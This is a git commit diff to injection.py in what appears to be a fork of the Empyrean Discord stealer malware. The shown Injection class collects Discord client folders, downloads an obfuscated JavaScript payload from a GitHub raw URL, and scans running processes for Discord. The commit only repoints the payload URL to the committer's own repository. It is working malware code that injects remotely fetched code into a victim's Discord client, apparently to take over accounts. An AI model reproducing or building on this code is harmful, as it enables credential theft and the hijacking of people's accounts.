e596a5102b73d650911f31d16674ed9ca99a3cdf
Anzax <41530272+AnzaxCR@users.noreply.github.com>
2023-01-07 22:55:32 -0600

    Update injection.py

--- src/components/injection.py
+++ src/components/injection.py
@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/AnzaxCR/empyrean-injection/main/obfuscated.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
